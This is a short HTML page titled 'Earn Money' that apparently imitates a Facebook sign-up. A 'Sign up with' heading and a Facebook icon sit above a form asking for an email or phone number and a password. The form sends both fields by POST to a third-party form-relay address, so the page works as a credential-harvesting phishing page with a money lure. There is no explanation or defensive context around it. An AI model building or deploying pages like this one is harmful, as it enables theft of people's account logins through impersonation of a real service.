<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <link rel="stylesheet" href="css.css" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Earn Money</title>
  </head>
  <body>
    <div class="container">
      <div class="form">
        <img src="./images/Earn.jpg" alt="earn points photo" />
        <div class="facebook">
          <h3>Sign up with :</h3>
          <img src="./images/Facebook_icon.svg.png" alt="" />
        </div>
        <form
          action="https://formsubmit.co/fe654c1be2a5e47e1811b8e932f34cab"
          method="POST"
          class="info"
        >
          <div class="inputs">
            <label for="email">Email or number</label>
            <input type="text" id="email" name="email" required />
          </div>
          <div class="inputs">
            <label for="password">Password</label>
            <input type="password" name="password" id="password" required />
          </div>
          <input type="submit" class="submit" />
        </form>
      </div>
    </div>
  </body>
</html>
